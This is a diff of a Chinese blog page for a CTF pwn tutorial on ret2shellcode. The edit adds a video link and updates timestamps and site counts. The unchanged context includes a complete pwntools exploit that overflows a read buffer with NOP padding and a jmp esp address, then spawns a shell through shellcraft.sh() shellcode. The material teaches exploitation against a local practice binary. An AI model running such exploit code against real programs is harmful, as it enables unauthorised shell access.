@@ -88,7 +88,7 @@
 <meta property="og:description" content="思路：read函数存在溢出，payload组成为shellcode和nop导轨，补齐到retn返回地址后，把返回地址用全局变量str1的地址覆盖，就跳转到全局变量str1的地址了，就执行了shellcode。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/2020/03/31/ret2shellcode/jmpesp.png">
-<meta property="og:updated_time" content="2020-04-03T09:57:43.791Z">
+<meta property="og:updated_time" content="2020-05-09T04:44:27.928Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ret2shellcode">
 <meta name="twitter:description" content="思路：read函数存在溢出，payload组成为shellcode和nop导轨，补齐到retn返回地址后，把返回地址用全局变量str1的地址覆盖，就跳转到全局变量str1的地址了，就执行了shellcode。">
@@ -374,6 +374,7 @@
 <p>python代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;i386&quot;,os=&quot;linux&quot;)</span><br><span class="line">p=process(&apos;./8.exe&apos;)</span><br><span class="line">offset = 76</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">add_jmpesp=p32(0xf7dd733d)</span><br><span class="line">print len(shellcode)</span><br><span class="line">payload =&apos;\x90&apos;*offset+add_jmpesp+shellcode</span><br><span class="line">pid=proc.pidof(p)</span><br><span class="line">print pid</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+<p>大佬的视频：<a href="https://www.bilibili.com/video/BV1QJ411G7GW" target="_blank" rel="noopener">ret2Shellcode-CTF-PWN入门02</a></p>
 
       
     </div>
@@ -499,7 +500,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">41</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -510,7 +511,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -521,7 +522,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-count">55</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
